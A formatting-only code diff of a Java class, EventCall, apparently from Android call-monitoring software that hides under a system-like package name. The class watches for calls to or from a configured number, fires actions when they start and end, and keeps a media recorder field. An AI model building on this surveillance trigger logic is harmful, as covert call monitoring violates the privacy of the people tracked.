@@ -20,14 +20,16 @@ import com.android.syssetup.listener.ListenerCall;
 import com.android.syssetup.util.Check;
 
 public class EventCall extends BaseEvent implements Observer<Call> {
-	/** The Constant TAG. */
+	/**
+	 * The Constant TAG.
+	 */
 	private static final String TAG = "EventCall"; //$NON-NLS-1$
 
 	private int actionOnExit, actionOnEnter;
 	private String number;
 	private boolean inCall = false;
 	private MediaRecorder recorder = null;
-	
+
 	@Override
 	public void actualStart() {
 		ListenerCall.self().attach(this);
@@ -74,11 +76,11 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 			// Match any number
 			if (number.length() == 0) {
 				inCall = true;
-				
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (notification): triggering inCall"); //$NON-NLS-1$
 				}
-				
+
 				onEnter();
 
 				return 0;
@@ -87,11 +89,11 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 			// Match a specific number
 			if (c.getNumber().contains(number)) {
 				inCall = true;
-				
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (notification): triggering inCall"); //$NON-NLS-1$
 				}
-				
+
 				onEnter();
 
 				return 0;
@@ -102,11 +104,11 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 
 		if (c.isOngoing() == false && inCall == true) {
 			inCall = false;
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): triggering endCall"); //$NON-NLS-1$
 			}
-			
+
 			onExit();
 			return 0;
 		}
